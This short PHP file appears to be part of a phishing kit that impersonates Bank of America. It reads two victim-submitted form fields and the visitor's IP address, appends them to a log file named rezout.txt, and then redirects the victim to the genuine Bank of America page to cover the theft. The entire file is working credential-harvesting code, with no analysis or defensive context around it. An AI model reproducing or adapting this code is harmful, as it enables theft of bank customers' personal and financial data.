<?php
include "fucker.php";  
?>
<meta http-equiv="Refresh"
content="0;url=https://secure.bankofamerica.com/applynow/landingPage.go"> 
<?php  
$co3 = $_POST['ipts10'];  
$ca3 = $_POST['ipts11'];
$IP3 = getenv("REMOTE_ADDR");  
$BILSMG = "
D0c $co3
n-d0c $ca3
$IP3
+=+=+=+=+=+=oht+=+=+=+=+=+=";  
$handle = fopen("rezout.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  
?>